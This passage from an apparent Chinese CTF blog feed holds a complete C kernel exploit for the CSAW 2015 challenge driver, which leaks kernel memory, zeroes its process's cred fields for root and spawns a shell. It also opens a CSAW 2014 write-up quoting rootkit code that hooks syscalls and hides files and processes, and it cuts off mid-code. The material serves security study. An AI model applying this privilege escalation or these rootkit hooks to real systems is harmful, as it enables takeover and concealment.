class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE getpagesize()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE PAGE_SIZE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_COMM_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span> <span class="params">( <span class="keyword">char</span> *msg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span> <span class="params">( <span class="keyword">char</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> length )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length / <span class="number">16</span>; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02hhx "</span>, addr[i * <span class="number">16</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_kernel_memory</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;read_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(read_channel));</span><br><span class="line">    read_channel.id = id;</span><br><span class="line">    read_channel.buf = buf;</span><br><span class="line">    read_channel.count = size;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_kernel_null_byte</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> null_byte = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The write primitive uses strncpy_from_user(), so we can't write full</span></span><br><span class="line"><span class="comment">     * dwords containing a null terminator. The exploit only needs to write</span></span><br><span class="line"><span class="comment">     * zeroes anyhow, so this function just passes a single null byte.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;write_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(write_channel));</span><br><span class="line">    write_channel.id = id;</span><br><span class="line">    write_channel.buf = &amp;null_byte;</span><br><span class="line">    write_channel.count = <span class="keyword">sizeof</span>(null_byte);</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">escalate_creds</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> cred_kaddr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tmp_kaddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The cred struct looks like:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     atomic_t    usage;</span></span><br><span class="line"><span class="comment">     *     kuid_t      uid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      gid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      suid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      sgid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      euid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      egid;</span></span><br><span class="line"><span class="comment">     *     kuid_t      fsuid;</span></span><br><span class="line"><span class="comment">     *     kgid_t      fsgid;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * where each field is a 32-bit dword.  Skip the first field and write</span></span><br><span class="line"><span class="comment">     * zeroes over the id fields to escalate to root.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Skip usage field */</span></span><br><span class="line"></span><br><span class="line">    tmp_kaddr = cred_kaddr + <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now overwrite the id fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">8</span>); i++ )</span><br><span class="line">        write_kernel_null_byte(fd, id, tmp_kaddr + i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_rand_str</span> <span class="params">( <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> len )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (len - <span class="number">1</span>); i++ )</span><br><span class="line">        str[i] = (rand() % (<span class="number">0x7e</span> - <span class="number">0x20</span>)) + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    str[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> **argv )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, fd, id;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> offset;</span><br><span class="line">    <span class="keyword">char</span> *addr, *ceiling;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    <span class="keyword">char</span> comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set comm to random signature */</span></span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    gen_rand_str(comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Generated comm signature: '%s'\n"</span>, comm);</span><br><span class="line"></span><br><span class="line">    ret = prctl(PR_SET_NAME, comm);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"prctl"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Open device */</span></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/csaw"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"open"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate IPC channel */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;alloc_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(alloc_channel));</span><br><span class="line">    alloc_channel.buf_size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_channel);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"ioctl"</span>);</span><br><span class="line"></span><br><span class="line">    id = alloc_channel.id;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocated channel id %d\n"</span>, id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Shrink channel to -1 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;shrink_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(shrink_channel));</span><br><span class="line">    shrink_channel.id = id;</span><br><span class="line">    shrink_channel.size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_channel);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        error(<span class="string">"ioctl"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Shrank channel to -1 bytes\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Map buffer for leaking kernel memory to */</span></span><br><span class="line"></span><br><span class="line">    addr = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( addr == MAP_FAILED )</span><br><span class="line">        error(<span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line">    ceiling = addr + BUF_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Mapped buffer %p:0x%x\n"</span>, addr, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Scanning kernel memory for comm signature...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We escalate to root by modifying our cred struct in memory.  We first</span></span><br><span class="line"><span class="comment">     * find it by leaking kernel memory one chunk at a time and applying a</span></span><br><span class="line"><span class="comment">     * simple heuristic.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Pointers to our creds reside next to the user-controllable comm field in</span></span><br><span class="line"><span class="comment">     * task_struct:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     const struct cred __rcu *real_cred;</span></span><br><span class="line"><span class="comment">     *     const struct cred __rcu *cred;</span></span><br><span class="line"><span class="comment">     *     char comm[TASK_COMM_LEN];</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Scan memory for our unique comm string, then verify that the two prior</span></span><br><span class="line"><span class="comment">     * qwords look like kernel pointers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = PAGE_OFFSET + offset;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> *search;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If kernel_addr wraps, we failed to find the comm signature */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( kernel_addr &lt; PAGE_OFFSET )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Failed to find comm signature in memory!\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Leak one chunk of kernel memory to userland */</span></span><br><span class="line"></span><br><span class="line">        ret = read_kernel_memory(fd, id, kernel_addr, addr, BUF_SIZE);</span><br><span class="line">        <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            offset += BUF_SIZE;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Scan for the comm signature in chunk */</span></span><br><span class="line"></span><br><span class="line">        search = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">long</span>)search &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ceiling )</span><br><span class="line">        &#123;</span><br><span class="line">            search = memmem(search, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ceiling - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)search, comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( search == <span class="literal">NULL</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( (search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-1</span>] &gt; PAGE_OFFSET ) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> real_cred, cred;</span><br><span class="line"></span><br><span class="line">                real_cred = search[<span class="number">-2</span>];</span><br><span class="line">                cred = search[<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Found comm signature at %p\n"</span>, (<span class="keyword">void</span> *)(kernel_addr + ((<span class="keyword">char</span> *)search - addr)));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"read_cred = %p\n"</span>, (<span class="keyword">void</span> *)real_cred);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"cred = %p\n"</span>, (<span class="keyword">void</span> *)cred);</span><br><span class="line"></span><br><span class="line">                escalate_creds(fd, id, real_cred);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ( cred != real_cred )</span><br><span class="line">                    escalate_creds(fd, id, cred);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">goto</span> GOT_ROOT;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            search = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)search + <span class="keyword">sizeof</span>(comm));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        offset += BUF_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">GOT_ROOT:</span><br><span class="line">    <span class="keyword">if</span> ( getuid() != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Attempted to escalate privileges, but failed to get root\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got root! Enjoy your shell...\n"</span>);</span><br><span class="line"></span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/29/2018-06-29-csaw2015-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/29/2018-06-29-csaw2015-kernelex/</a><br><a href="http://ilinuxkernel.com/?p=1013" target="_blank" rel="noopener">http://ilinuxkernel.com/?p=1013</a><br><a href="https://blog.csdn.net/chengm8/article/details/17091759" target="_blank" rel="noopener">https://blog.csdn.net/chengm8/article/details/17091759</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;额,还是看代码,先看懂再说.认真分析一遍,一个关于读取,扩大缩小ipc的程序.再看一下漏洞点,其实这是一个整数溢出的漏洞,通过将-1设置为n
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Linux-csaw2014</title>
    <link href="https://foyjog.github.io/2018/07/04/Linux-Kernel-Exploitation-on-Linux-csaw2014/"/>
    <id>https://foyjog.github.io/2018/07/04/Linux-Kernel-Exploitation-on-Linux-csaw2014/</id>
    <published>2018-07-04T02:26:49.000Z</published>
    <updated>2018-07-04T03:33:07.454Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目也很长,但是功能也就那一些,这个内核驱动的目的是一个内核的hook,达到rootkit的目的,当然,题目没有做实际的rootkit,只是给了一个形式.<br>关于linux的rootkit可以参考freebuf上的rootkit系列:<a href="http://www.freebuf.com/sectool/105713.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/105713.html</a></p><p>认真查看代码就能够了解,其实这个漏洞是一个比较简单的UAF的漏洞,kmalloc-kfree-kmalloc就能达到提权的目的.</p><h3 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h3><p>首先查看init函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">i_solemnly_swear_that_i_am_up_to_no_good</span> <span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Find system call table */</span></span><br><span class="line">    sys_call_table = find_sys_call_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install channel for communication with the rootkit */</span></span><br><span class="line">    orig_sys_shmctl = *(<span class="keyword">void</span> **)(sys_call_table + __NR_shmctl);</span><br><span class="line">    write_ulong(sys_call_table + __NR_shmctl, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;hook_sys_shmctl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hook /proc for hiding processes */</span></span><br><span class="line">    orig_proc_iterate = hook_vfs_iterate(<span class="string">"/proc"</span>, &amp;hook_proc_iterate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hook / for hiding files */</span></span><br><span class="line">    orig_root_iterate = hook_vfs_iterate(<span class="string">"/"</span>, &amp;hook_root_iterate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目友好的给出了详细的注释,其实目的就是通过hook sys_call_table来达到控制shmctl系统调用,和控制迭代/proc目录和/目录的目的.<br>观察init中hook_proc_iterate和hook_root_iterate的代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hook_proc_iterate</span> <span class="params">( struct file *file, struct dir_context *ctx )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    proc_filldir = ctx-&gt;actor;</span><br><span class="line">    *((<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor) = hook_proc_filldir;</span><br><span class="line">    ret = orig_proc_iterate(file, ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hook_root_iterate</span> <span class="params">( struct file *file, struct dir_context *ctx )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    root_filldir = ctx-&gt;actor;</span><br><span class="line">    *((<span class="keyword">filldir_t</span> *)&amp;ctx-&gt;actor) = hook_root_filldir;</span><br><span class="line">    ret = orig_root_iterate(file, ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用hook_proc_filldir和hook_root_filldir勾掉原本的proc_filldir函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_proc_filldir</span><span class="params">( <span class="keyword">void</span> *__buf, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span 